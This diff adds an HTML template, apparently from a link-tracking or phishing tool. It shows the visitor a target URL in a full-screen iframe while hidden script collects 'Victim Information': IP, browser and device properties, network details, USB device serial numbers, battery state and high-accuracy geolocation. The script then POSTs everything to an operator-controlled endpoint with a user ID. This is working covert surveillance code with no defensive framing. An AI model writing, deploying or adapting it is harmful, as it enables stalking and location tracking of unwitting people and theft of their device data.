@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+</head>
+<body>
+  <iframe style="border:0;overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0;" src="<%= url %>"></iframe>
+  <script>
+    (async () => {
+      var output = "";
+
+      output += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
+      output += "<br><br><b>⏳ Date In Victim's Device :</b> " + new Date() + "<br>";
+
+      const infos = ["productSub",
+        "vendor",
+        "maxTouchPoints",
+        "doNotTrack",
+        "hardwareConcurrency",
+        "cookieEnabled",
+        "appCodeName",
+        "appName",
+        "appVersion",
+        "platform",
+        "product",
+        "userAgent",
+        "language",
+        "languages",
+        "webdriver",
+        "pdfViewerEnabled",
+        "deviceMemory"];
+
+      output += "<br><b>📱 Device Information</b><br>";
+      for (var i = 0; i < infos.length; i++) {
+        if (infos[i] in navigator) {
+          var str = navigator[infos[i]];
+          output += "<b>" + infos[i] + "</b>: <code>" + str + "</code><br>";
+        }
+      }
+
+
+      var xoc = ["type",
+        "rtt",
+        "saveData",
+        "effectiveType",
+        "downlink",
+        "downlinkMax"];
+      if ("connection" in navigator) {
+        output += "<br><b>🕸️ Network Information</b><br>";
+        for (var i = 0; i < xoc.length; i++) {
+          var str = navigator.connection[xoc[i]];
+          output += "<b>"+xoc[i] +"</b>: <code>"+str+"</code><br>";
+        }}
+
+      if ("usb" in navigator) {
+        await navigator.usb.getDevices()
+        .then(devices => {
+          output += "<br><b>🔌 Total USB devices connected:</b> " + devices.length+"<br>";
+          devices.forEach(device => {
+            output += "<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber+"</code><br>";
+          });
+        });
+      }
+
+      if ("getBattery" in navigator) {
+        await navigator.getBattery().then(function(battery) {
+          output += "<br><b>🔋 Battery Information</b><br>";
+          output += "<b>🔋Battery Level:</b> " +battery.level*100+"%<br><b>⚡ Is Battery Charging:</b> "+battery.charging+"";
+        });
+      }
+
+      if (!navigator.geolocation) {
+        output += "<br><b>📍 Location Information</b><br>";
+        output += "⚠️ Location API not avilable";
+      }
+
+      const successCB = async (position) => {
+        let {
+          latitude,
+          longitude,
+          accuracy
+        } = position.coords;
+
+
+        const response = await fetch("<%= a %>/location", {
+          method: 'POST',
+          body: JSON.stringify({
+            latitude,
+            longitude,
+            accuracy,
+            uid: <%= uid %>
+          }), headers: {
+            'Content-Type': 'application/json'
+          }
+        });
+
+        const data = await response.text();
+
+      };
+
+      const errorCB = async(e)=> {
+        output += "<br><b>📍 Location Information</b><br>";
+        output += "⚠️ Location ERROR: <code>"+e.message+"</code>";
+      }
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(successCB, errorCB, {
+          enableHighAccuracy: true, maximumAge: 0
+        });
+      }
+
+      try {
+        const response = await fetch('<%=a %>/',
+          {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              // Set content type to JSON
+            },
+            body: JSON.stringify({
+              data: output, uid: <%=uid %>
+            }),
+            // Convert data to JSON
+          });
+
+        if (response.ok) {
+          // const responseData = await response.text();
+          //           alert(responseData);
+        } else {
+          console.error('Error:', response.status);
+        }
+      } catch (e) {
+        console.error (e)
+      }
+
+    })();
+  </script>
+</body>
+</html>
